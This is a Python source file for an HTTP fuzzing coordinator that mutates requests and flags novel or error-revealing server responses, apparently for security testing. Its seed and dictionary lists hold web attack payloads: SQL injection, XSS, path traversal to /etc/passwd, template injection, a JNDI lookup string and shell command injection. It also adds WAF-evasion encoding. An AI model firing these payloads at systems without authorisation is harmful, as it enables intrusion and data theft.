"""
fuzzer_driver.py — LibAFL-backed HTTP fuzzing coordinator.

Feature flags:
    ONEINFINITY_RUST_FUZZER=1   → spawn oi-fuzzer binary if available
    OI_FUZZER_BIN               → override binary path (default: oi-fuzzer)

Fallback mode (no binary):
    Pure-Python coverage-guided fuzzing using HTTP response fingerprinting.
    Corpus management, WAF evasion feedback, and HTTP-aware mutations are
    always available regardless of whether LibAFL is installed.
"""
from __future__ import annotations

import hashlib
import json
import logging
import os
import random
import re
import shutil
import subprocess
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Iterator, List, Optional, Set

log = logging.getLogger("oi.fuzzer_driver")

OI_FUZZER_BIN = os.environ.get("OI_FUZZER_BIN", "")
# Resolve binary: env-override > release build path > PATH
_RELEASE_FUZZER = str(
    Path(__file__).parent.parent.parent / "rust" / "oi-fuzzer" / "target" / "release" / "oi-fuzzer"
)

# ── error signatures that indicate a high-value finding ──────────────────────
_ERROR_PATTERNS = [
    re.compile(p, re.I)
    for p in [
        r"stack\s+trace",
        r"exception\s+in\s+thread",
        r"Traceback\s+\(most\s+recent",
        r"SQL\s+(syntax|error|statement)",
        r"mysql.*error",
        r"ORA-\d{5}",
        r"pg_query",
        r"Warning:\s+\w+\(\)",
        r"Fatal\s+error:",
        r"/var/www/",
        r"/home/\w+/",
        r"C:\\\\(Users|inetpub|Windows)",
        r"root:/",
        r"<b>Notice</b>:",
        r"<b>Warning</b>:",
    ]
]

# ── HTTP-aware seed payloads ───────────────────────────────────────────────────
_HTTP_SEEDS: Dict[str, List[str]] = {
    "header": [
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "/../../../etc/passwd",
        "${7*7}",
        "{{7*7}}",
        "%0d%0aX-Injected: pwned",
        "test\r\nX-Injected: pwned",
        "; ls -la",
        "| id",
        "`id`",
    ],
    "param": [
        "1 OR 1=1",
        "1' OR '1'='1",
        "1 UNION SELECT NULL--",
        "<img src=x onerror=alert(1)>",
        "../../../../etc/passwd",
        "${jndi:ldap://x.x.x.x/a}",
        "{{constructor.constructor('return process')()}}",
        "1; DROP TABLE users--",
        "0x31206F7220313D31",
        "%27%20OR%20%271%27%3D%271",
    ],
    "body": [
        '{"__proto__": {"admin": true}}',
        '{"$where": "this.a == this.b"}',
        "<foo><![CDATA[</foo><bar>]]></bar>",
        "a=1&a=2&a=3",
        "%00",
        "A" * 8192,
        "\x00" * 100,
    ],
    "path": [
        "/../../../etc/passwd",
        "/..%2F..%2F..%2Fetc%2Fpasswd",
        "/.%2e/.%2e/etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "/api/v1/../../admin",
        "/;/admin",
        "/%00/",
    ],
}

# ── dictionary for insertion mutations ───────────────────────────────────────
_DICT_ENTRIES = [
    "' OR 1=1--",
    "admin'--",
    "1; WAITFOR DELAY '0:0:5'--",
    "<svg/onload=alert(1)>",
    "{{7*7}}",
    "${7*7}",
    "$(id)",
    "; cat /etc/passwd",
    "../",
    "file:///etc/passwd",
    "gopher://",
    "dict://",
    "ftp://",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "\r\nContent-Length: 0\r\n\r\n",
    "Transfer-Encoding: chunked\r\n",
]


def _resolve_fuzzer_bin() -> str:
    """Return the oi-fuzzer binary path to use, or empty string if unavailable.

    Resolution order:
      1. OI_FUZZER_BIN env var (explicit override)
      2. src/rust/oi-fuzzer/target/release/oi-fuzzer (release build)
      3. 'oi-fuzzer' on PATH
    """
    if OI_FUZZER_BIN:
        return OI_FUZZER_BIN  # explicit env override
    if os.path.isfile(_RELEASE_FUZZER) and os.access(_RELEASE_FUZZER, os.X_OK):
        return _RELEASE_FUZZER
    path_bin = shutil.which("oi-fuzzer")
    return path_bin if path_bin else ""


def _fuzzer_available() -> bool:
    try:
        return bool(_resolve_fuzzer_bin())
    except Exception:
        return False


# ── response fingerprint ──────────────────────────────────────────────────────

def _fingerprint(status: int, body: bytes, headers: Dict[str, str]) -> str:
    """Stable fingerprint of an HTTP response for novelty detection."""
    h = hashlib.sha256()
    h.update(str(status).encode())
    h.update(str(len(body)).encode())
    for k in sorted(headers):
        h.update(k.lower().encode())
        h.update(headers[k][:64].encode())
    return h.hexdigest()[:16]


def _detect_errors(body: bytes) -> List[str]:
    """Return matched error pattern labels — these indicate high-value hits."""
    text = body.decode("utf-8", errors="replace")[:4096]
    return [p.pattern for p in _ERROR_PATTERNS if p.search(text)]


# ── corpus management ─────────────────────────────────────────────────────────

@dataclass
class CorpusEntry:
    payload: str
    target_part: str          # header|param|body|path
    fingerprint: str
    status_code: int
    body_len: int
    error_sigs: List[str] = field(default_factory=list)
    timestamp: float = field(default_factory=time.time)
    is_finding: bool = False

    def to_dict(self) -> Dict[str, Any]:
        return {
            "type": "finding" if self.is_finding else "corpus",
            "payload": self.payload,
            "target_part": self.target_part,
            "fingerprint": self.fingerprint,
            "status_code": self.status_code,
            "body_len": self.body_len,
            "error_sigs": self.error_sigs,
            "timestamp": self.timestamp,
        }


class CorpusManager:
    """Thread-safe corpus with deduplication and on-disk persistence."""

    def __init__(self, corpus_dir: Optional[str] = None) -> None:
        self._dir: Optional[Path] = Path(corpus_dir) if corpus_dir else None
        if self._dir:
            self._dir.mkdir(parents=True, exist_ok=True)
        self._seen_fingerprints: Set[str] = set()
        self._entries: List[CorpusEntry] = []

    def is_novel(self, fingerprint: str) -> bool:
        return fingerprint not in self._seen_fingerprints

    def add(self, entry: CorpusEntry) -> bool:
        """Add entry if novel. Returns True if accepted."""
        if entry.fingerprint in self._seen_fingerprints:
            return False
        self._seen_fingerprints.add(entry.fingerprint)
        self._entries.append(entry)
        if self._dir:
            fname = self._dir / f"{entry.fingerprint}.json"
            try:
                fname.write_text(json.dumps(entry.to_dict(), indent=2))
            except OSError as e:
                log.debug("corpus write failed: %s", e)
        return True

    def load_from_disk(self) -> None:
        if not self._dir:
            return
        for f in self._dir.glob("*.json"):
            try:
                data = json.loads(f.read_text())
                fp = data.get("fingerprint", "")
                if fp and fp not in self._seen_fingerprints:
                    self._seen_fingerprints.add(fp)
                    entry = CorpusEntry(
                        payload=data.get("payload", ""),
                        target_part=data.get("target_part", "param"),
                        fingerprint=fp,
                        status_code=data.get("status_code", 0),
                        body_len=data.get("body_len", 0),
                        error_sigs=data.get("error_sigs", []),
                        timestamp=data.get("timestamp", 0.0),
                        is_finding=data.get("type") == "finding",
                    )
                    self._entries.append(entry)
            except Exception as e:
                log.debug("corpus load error %s: %s", f, e)

    @property
    def entries(self) -> List[CorpusEntry]:
        return list(self._entries)

    def interesting_payloads(self) -> List[str]:
        return [e.payload for e in self._entries]


# ── HTTP-aware mutation strategies ────────────────────────────────────────────

class HttpMutator:
    """Pure-Python HTTP-aware payload mutator."""

    def __init__(self, rng: Optional[random.Random] = None) -> None:
        self._rng = rng or random.Random()

    # -- low-level bit/byte operations ----------------------------------------

    def _bit_flip(self, data: str) -> str:
        if not data:
            return data
        b = bytearray(data.encode("latin-1", errors="replace"))
        idx = self._rng.randrange(len(b))
        bit = 1 << self._rng.randrange(8)
        b[idx] ^= bit
        return b.decode("latin-1", errors="replace")

    def _byte_flip(self, data: str) -> str:
        if not data:
            return data
        b = bytearray(data.encode("latin-1", errors="replace"))
        idx = self._rng.randrange(len(b))
        b[idx] = self._rng.randint(0, 255)
        return b.decode("latin-1", errors="replace")

    def _splice(self, a: str, b: str) -> str:
        if not a or not b:
            return a or b
        cut_a = self._rng.randrange(len(a))
        cut_b = self._rng.randrange(len(b))
        return a[:cut_a] + b[cut_b:]

    def _dictionary_insert(self, data: str) -> str:
        entry = self._rng.choice(_DICT_ENTRIES)
        if not data:
            return entry
        pos = self._rng.randrange(len(data) + 1)
        return data[:pos] + entry + data[pos:]

    # -- encoding evasion -----------------------------------------------------

    def _url_encode_random(self, data: str) -> str:
        return "".join(
            f"%{ord(c):02X}" if self._rng.random() < 0.4 else c
            for c in data
        )

    def _double_url_encode(self, data: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(data, safe=""), safe="")

    def _html_encode(self, data: str) -> str:
        return "".join(f"&#{ord(c)};" for c in data)

    # -- format-aware mutations -----------------------------------------------

    def _mutate_json_value(self, data: str) -> str:
        """Inject into JSON string values."""
        try:
            obj = json.loads(data)
        except (json.JSONDecodeError, TypeError):
            return data
        self._inject_into_obj(obj)
        return json.dumps(obj)

    def _inject_into_obj(self, obj: Any) -> None:
        if isinstance(obj, dict):
            for k in list(obj):
                if isinstance(obj[k], str):
                    obj[k] = self._rng.choice(_DICT_ENTRIES)
                elif isinstance(obj[k], (dict, list)):
                    self._inject_into_obj(obj[k])
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                if isinstance(item, str):
                    obj[i] = self._rng.choice(_DICT_ENTRIES)
                elif isinstance(item, (dict, list)):
                    self._inject_into_obj(item)

    def _mutate_xml_value(self, data: str) -> str:
        """Inject into XML text nodes."""
        entry = self._rng.choice(_DICT_ENTRIES).replace("<", "&lt;").replace(">", "&gt;")
        return re.sub(r">([^<]*)<", f">{entry}<", data, count=1)

    def _mutate_url_param(self, data: str) -> str:
        """Inject into URL query string parameter values."""
        if "?" not in data:
            return data + "?" + self._rng.choice(_DICT_ENTRIES[:5])
        base, qs = data.split("?", 1)
        params = urllib.parse.parse_qs(qs, keep_blank_values=True)
        if not params:
            return data
        key = self._rng.choice(list(params.keys()))
        params[key] = [self._rng.choice(_DICT_ENTRIES)]
        return base + "?" + urllib.parse.urlencode(params, doseq=True)

    def _mutate_multipart_field(self, data: str) -> str:
        """Inject into multipart/form-data field values."""
        return re.sub(
            r"(Content-Disposition:.*?\r\n\r\n)([^\r\n-]*)",
            lambda m: m.group(1) + self._rng.choice(_DICT_ENTRIES),
            data,
            count=1,
            flags=re.DOTALL,
        )

    # -- HTTP-part-specific mutators ------------------------------------------

    def mutate_header(self, value: str) -> str:
        strat = self._rng.choice([
            self._bit_flip,
            self._byte_flip,
            self._dictionary_insert,
            self._url_encode_random,
            self._double_url_encode,
        ])
        return strat(value)

    def mutate_param(self, value: str) -> str:
        strat = self._rng.choice([
            self._bit_flip,
            self._byte_flip,
            self._dictionary_insert,
            self._double_url_encode,
            self._html_encode,
            self._url_encode_random,
        ])
        return strat(value)

    def mutate_body(self, value: str) -> str:
        if value.lstrip().startswith("{"):
            return self._mutate_json_value(value)
        if value.lstrip().startswith("<"):
            return self._mutate_xml_value(value)
        if "boundary=" in value or "Content-Disposition:" in value:
            return self._mutate_multipart_field(value)
        return self._rng.choice([
            self._bit_flip,
            self._byte_flip,
            self._dictionary_insert,
        ])(value)

    def mutate_path(self, value: str) -> str:
        strat = self._rng.choice([
            self._bit_flip,
            self._byte_flip,
            lambda v: self._mutate_url_param(v),
            self._double_url_encode,
            self._dictionary_insert,
        ])
        return strat(value)

    def generate_batch(
        self,
        seeds: List[str],
        target_part: str,
        n: int,
        corpus_payloads: Optional[List[str]] = None,
    ) -> List[str]:
        """Generate n mutated payloads for the given HTTP part."""
        all_seeds = list(seeds) + (corpus_payloads or [])
        if not all_seeds:
            all_seeds = _HTTP_SEEDS.get(target_part, _HTTP_SEEDS["param"])

        mutate_fn = {
            "header": self.mutate_header,
            "param": self.mutate_param,
            "body": self.mutate_body,
            "path": self.mutate_path,
        }.get(target_part, self.mutate_param)

        results: List[str] = []
        for _ in range(n):
            seed = self._rng.choice(all_seeds)
            if len(all_seeds) > 1 and self._rng.random() < 0.15:
                # splice from two seeds
                other = self._rng.choice(all_seeds)
                seed = self._splice(seed, other)
            results.append(mutate_fn(seed))
        return results


# ── simulated HTTP response (for pure-Python fallback testing) ─────────────────

@dataclass
class MockResponse:
    status: int
    body: bytes
    headers: Dict[str, str] = field(default_factory=dict)


# ── coverage feedback engine ───────────────────────────────────────────────────

class CoverageFeedback:
    """
    HTTP response coverage feedback — works without LibAFL binary.

    Fingerprints (status, body-len bucket, header set) to detect novel
    server behaviours.  Error pattern detection marks entries as findings.
    """

    def __init__(self, corpus: CorpusManager) -> None:
        self._corpus = corpus

    def process(
        self,
        payload: str,
        target_part: str,
        response: MockResponse,
    ) -> Optional[CorpusEntry]:
        fp = _fingerprint(response.status, response.body, response.headers)
        if not self._corpus.is_novel(fp):
            return None

        error_sigs = _detect_errors(response.body)
        is_finding = bool(error_sigs) or response.status in (500, 501, 502, 503)

        entry = CorpusEntry(
            payload=payload,
            target_part=target_part,
            fingerprint=fp,
            status_code=response.status,
            body_len=len(response.body),
            error_sigs=error_sigs,
            is_finding=is_finding,
        )
        self._corpus.add(entry)
        return entry

    def waf_evaded(self, status: int) -> bool:
        """True if the response suggests WAF evasion succeeded (non-block)."""
        return status not in (403, 406, 429, 444, 451)


# ── HTTP fuzzing session ───────────────────────────────────────────────────────

class HttpFuzzSession:
    """
    Runs an HTTP fuzzing session against a real or simulated target.

    When `send_fn` is provided it must be callable as:
        send_fn(payload: str, target_part: str) -> MockResponse

    Without `send_fn` the session generates a corpus from seeds only
    (useful for offline mutation corpus building and unit testing).
    """

    def __init__(
        self,
        url: str = "",
        target_parts: Optional[List[str]] = None,
        corpus_dir: str = "",
        iterations: int = 1000,
        timeout_secs: int = 60,
        send_fn: Optional[Any] = None,
        seed: Optional[int] = None,
    ) -> None:
        self.url = url
        self.target_parts = target_parts or ["param", "header", "body", "path"]
        self.corpus = CorpusManager(corpus_dir)
        self.corpus.load_from_disk()
        self.iterations = iterations
        self.timeout_secs = timeout_secs
        self.send_fn = send_fn
        self._rng = random.Random(seed)
        self._mutator = HttpMutator(rng=self._rng)
        self._feedback = CoverageFeedback(self.corpus)
        self._findings: List[CorpusEntry] = []

    def _seeds_for(self, part: str) -> List[str]:
        return list(_HTTP_SEEDS.get(part, _HTTP_SEEDS["param"]))

    def _iter_mutations(self, part: str) -> Iterator[str]:
        """Infinite generator of mutations for a given part."""
        seeds = self._seeds_for(part)
        while True:
            corpus_payloads = self.corpus.interesting_payloads()
            batch = self._mutator.generate_batch(seeds, part, 16, corpus_payloads)
            for p in batch:
                yield p

    def run(self) -> List[Dict[str, Any]]:
        """
        Execute the fuzzing session.

        Returns list of corpus/finding dicts (all novel responses).
        """
        deadline = time.monotonic() + self.timeout_secs
        part_iters = {p: self._iter_mutations(p) for p in self.target_parts}
        results: List[Dict[str, Any]] = []
        i = 0

        while i < self.iterations and time.monotonic() < deadline:
            part = self.target_parts[i % len(self.target_parts)]
            payload = next(part_iters[part])

            if self.send_fn is not None:
                try:
                    resp = self.send_fn(payload, part)
                except Exception as e:
                    log.debug("send_fn error: %s", e)
                    i += 1
                    continue

                # WAF evasion feedback: skip mutation if blocked
                if not self._feedback.waf_evaded(resp.status):
                    log.debug("WAF block (status=%d) — next mutation", resp.status)
                    i += 1
                    continue

                entry = self._feedback.process(payload, part, resp)
                if entry is not None:
                    d = entry.to_dict()
                    results.append(d)
                    if entry.is_finding:
                        self._findings.append(entry)
                        log.info("HIGH-VALUE FINDING: %s status=%d sigs=%s",
                                 payload[:80], resp.status, entry.error_sigs)
                    else:
                        log.debug("corpus hit: fingerprint=%s status=%d",
                                  entry.fingerprint, resp.status)
            else:
                # Offline mode: just accumulate mutations as corpus
                fake_fp = hashlib.sha256(payload.encode()).hexdigest()[:16]
                entry = CorpusEntry(
                    payload=payload,
                    target_part=part,
                    fingerprint=fake_fp,
                    status_code=0,
                    body_len=0,
                )
                if self.corpus.add(entry):
                    results.append(entry.to_dict())

            i += 1

        log.info(
            "FuzzSession complete: %d iterations, %d novel responses, %d findings",
            i, len(results), len(self._findings),
        )
        return results

    @property
    def findings(self) -> List[CorpusEntry]:
        return list(self._findings)


# ── main driver class ─────────────────────────────────────────────────────────

class FuzzerDriver:
    """
    LibAFL-backed HTTP fuzzing coordinator.

    When ONEINFINITY_RUST_FUZZER=1 and oi-fuzzer is on PATH:
        Spawns the oi-fuzzer binary for coverage-guided LibAFL fuzzing,
        then supplements results with the pure-Python HTTP session.

    Fallback mode (always available):
        Pure-Python corpus management + coverage feedback + HTTP-aware
        mutations — still effective without LibAFL installed.
    """

    def __init__(
        self,
        target: str = "http",
        timeout_secs: int = 60,
        corpus_dir: Optional[str] = None,
        iterations: int = 1000,
        url: str = "",
        target_parts: Optional[List[str]] = None,
        send_fn: Optional[Any] = None,
        seed: Optional[int] = None,
        target_type: str = "http",
        mutation_strategy: str = "havoc",
    ) -> None:
        self.target = target
        self.target_type = target_type
        self.mutation_strategy = mutation_strategy
        self.timeout_secs = timeout_secs
        self.url = url
        self.target_parts = target_parts or ["param", "header", "body", "path"]
        self.send_fn = send_fn
        self.seed = seed
        self.iterations = iterations
        # corpus_dir: explicit arg > ONEINFINITY_CORPUS_DIR env > ~/.oneinfinity/corpus/<domain_hash>
        self._corpus_dir_arg: Optional[str] = corpus_dir
        self._corpus_stats: List[Dict[str, Any]] = []
        self._enabled_libafl: bool = (
            os.environ.get("ONEINFINITY_RUST_FUZZER", "") not in ("", "0", "false", "False")
            and _fuzzer_available()
        )

    @property
    def _corpus_dir(self) -> str:
        """Resolve corpus directory: arg > ONEINFINITY_CORPUS_DIR > ~/.oneinfinity/corpus/<domain_hash>."""
        if self._corpus_dir_arg:
            return self._corpus_dir_arg
        env_dir = os.environ.get("ONEINFINITY_CORPUS_DIR", "")
        if env_dir:
            return env_dir
        # derive a per-domain sub-directory from the target URL
        domain_hash = hashlib.sha256(self.url.encode()).hexdigest()[:12] if self.url else "default"
        return str(Path.home() / ".oneinfinity" / "corpus" / domain_hash)


    # CL.TE / H2.TE desync patterns — findings matching these get severity 'high'
    _DESYNC_PATTERN = re.compile(
        r"(transfer-encoding\s*:\s*chunked|content-length\s*:|CL\.TE|H2\.TE|te:\s*chunked)",
        re.I,
    )

    def _run_libafl_binary(self) -> List[Dict[str, Any]]:
        """Spawn the oi-fuzzer binary and collect NDJSON output."""
        bin_path = _resolve_fuzzer_bin()
        if not bin_path:
            log.warning("FuzzerDriver._run_libafl_binary: oi-fuzzer binary not found")
            return []
        corpus = self._corpus_dir
        cmd = [
            bin_path,
            "--target", self.target_type,
            "--strategy", self.mutation_strategy,
            "--timeout-secs", str(self.timeout_secs),
            "--iterations", str(self.iterations),
            "--corpus-dir", corpus,
        ]

        findings: List[Dict[str, Any]] = []
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=self.timeout_secs + 15,
            )
            for line in result.stdout.splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    item = json.loads(line)
                    event_type = item.get("type")

                    if event_type == "coverage_edge":
                        # Translate to a finding with info severity
                        finding = {
                            "type": "finding",
                            "vuln_type": "fuzzer_new_path",
                            "severity": "info",
                            "edge_id": item.get("edge_id"),
                            "input_hash": item.get("input_hash"),
                            "payload": item.get("input_hash", ""),
                        }
                        findings.append(finding)

                    elif event_type == "corpus_distilled":
                        self._corpus_stats.append(item)
                        log.info(
                            "FuzzerDriver: corpus distilled %d → %d",
                            item.get("before", 0), item.get("after", 0),
                        )

                    elif event_type == "finding":
                        payload_str = str(item.get("payload", ""))
                        if self._DESYNC_PATTERN.search(payload_str):
                            item = dict(item, severity="high")
                        findings.append(item)

                    elif event_type in ("corpus", "stats"):
                        findings.append(item)

                except json.JSONDecodeError:
                    log.debug("FuzzerDriver: non-JSON line: %s", line[:120])
        except subprocess.TimeoutExpired as e:
            log.warning("FuzzerDriver: timeout: %s", e)
        except FileNotFoundError as e:
            log.warning("FuzzerDriver: binary not found: %s", e)
        except Exception as e:  # noqa: BLE001
            log.warning("FuzzerDriver: unexpected error: %s", e)
        return findings

    def run(self) -> List[Dict[str, Any]]:
        """
        Run fuzzing and return list of corpus/finding/stats dicts.

        Always runs pure-Python HTTP fuzzing session (fallback mode).
        Additionally spawns LibAFL binary if available and flag is set.
        """
        results: List[Dict[str, Any]] = []

        # Phase 1: LibAFL binary (if available)
        if self._enabled_libafl:
            log.info("FuzzerDriver: spawning oi-fuzzer binary")
            libafl_results = self._run_libafl_binary()
            results.extend(libafl_results)
            log.info("FuzzerDriver: oi-fuzzer returned %d items", len(libafl_results))
        else:
            log.debug("FuzzerDriver: oi-fuzzer disabled/unavailable — pure-Python mode")

        # Phase 2: pure-Python HTTP session (always runs)
        session = HttpFuzzSession(
            url=self.url,
            target_parts=self.target_parts,
            corpus_dir=self._corpus_dir,
            iterations=self.iterations,
            timeout_secs=self.timeout_secs,
            send_fn=self.send_fn,
            seed=self.seed,
        )
        py_results = session.run()
        results.extend(py_results)
        log.info("FuzzerDriver: Python session returned %d items", len(py_results))

        return results

    def adaptive_run(self, max_secs: int = 90) -> List[Dict[str, Any]]:
        """
        Run fuzzing in a loop up to *max_secs* wall time.

        Each iteration calls run() with the current corpus directory.
        Stops early when no new coverage_edge events have been seen for
        30 consecutive seconds, or when the time budget is exhausted.

        Returns the merged list of all findings across all iterations.
        If the oi-fuzzer binary is absent *and* no send_fn is configured,
        returns [] immediately (no-op fallback).
        """
        if not self._enabled_libafl and self.send_fn is None:
            log.debug("FuzzerDriver.adaptive_run: binary absent and no send_fn — returning []")
            return []

        _NO_COVERAGE_THRESHOLD = 30  # seconds with no new edges before stopping

        all_findings: List[Dict[str, Any]] = []
        deadline = time.monotonic() + max_secs
        last_new_edge_ts = time.monotonic()

        iteration = 0
        while time.monotonic() < deadline:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break

            # Cap each sub-run to remaining wall time (min 1s for a clean return)
            sub_timeout = max(1, min(self.timeout_secs, int(remaining)))
            saved_timeout = self.timeout_secs
            self.timeout_secs = sub_timeout

            iteration += 1
            log.info("FuzzerDriver.adaptive_run: iteration %d (remaining=%.1fs)", iteration, remaining)

            try:
                batch = self.run()
            except Exception as e:  # noqa: BLE001
                log.warning("FuzzerDriver.adaptive_run: run() error on iteration %d: %s", iteration, e)
                batch = []
            finally:
                self.timeout_secs = saved_timeout

            new_edges = [r for r in batch if r.get("vuln_type") == "fuzzer_new_path"]
            if new_edges:
                last_new_edge_ts = time.monotonic()

            all_findings.extend(batch)

            # Stop if no new coverage for _NO_COVERAGE_THRESHOLD seconds
            if time.monotonic() - last_new_edge_ts >= _NO_COVERAGE_THRESHOLD:
                log.info(
                    "FuzzerDriver.adaptive_run: no new edges for %ds — stopping after %d iterations",
                    _NO_COVERAGE_THRESHOLD, iteration,
                )
                break

        log.info(
            "FuzzerDriver.adaptive_run: finished %d iterations, %d total findings",
            iteration, len(all_findings),
        )
        return all_findings


    def generate_corpus(self, seed_payload: str, n: int = 50) -> List[str]:
        """
        Generate n mutated payloads from a seed — useful for offline corpus building.
        Tries Rust HttpFuzzer first, falls back to pure-Python mutator.
        """
        try:
            from oneinfinity_core import HttpFuzzer  # type: ignore[import]
            fz = HttpFuzzer()
            return fz.generate_corpus(seed_payload, n)
        except Exception:
            pass

        mutator = HttpMutator(rng=random.Random(self.seed))
        results: List[str] = []
        for part in self.target_parts:
            results.extend(
                mutator.generate_batch([seed_payload], part, n // len(self.target_parts) + 1)
            )
        return results[:n]
